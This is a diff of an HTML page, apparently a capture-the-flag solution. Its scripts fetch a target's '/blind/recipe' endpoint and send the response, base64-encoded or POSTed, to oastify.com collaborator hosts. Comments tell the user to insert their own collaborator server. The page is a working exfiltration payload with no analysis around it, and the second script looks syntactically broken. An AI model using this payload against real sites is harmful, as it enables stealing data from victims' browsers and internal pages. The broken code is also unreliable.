@@ -1,9 +1,19 @@
 <html lang="en">
     <head>
 
+
         <script>
-            let x = fetch('https://black.ctfio.com/blind/recipe')
-            fetch("https://fq94gnkiqlef2gdexcpoxhqgu707oxcm.oastify.com", {method: "POST", body: JSON.stringify(x)})
+                exfil = new XMLHttpRequest();
+                // Set the correct server below e.g https://abcdefg.ctfio.com
+                exfil.open("GET","https://jason.ctfio.com/blind/recipe");
+                exfil.send();
+                // put your colab instance below to you can capture the contents of /blind/recipe
+                exfil.onload = function(){ document.write('<img src="https://wlllb4fzl29wxx8vstk5sylxpovpjf74.oastify.com/?x=' + btoa(this.responseText) + '">'); }
+        </script>
+        <script>
+            let x = fetch('https://jason.ctfio.com/blind/recipe').then((res) => {
+                fetch("https://fq94gnkiqlef2gdexcpoxhqgu707oxcm.oastify.com", {method: "POST", body: JSON.stringify(x)})
+            }
         </script>
     </head>
     <body>
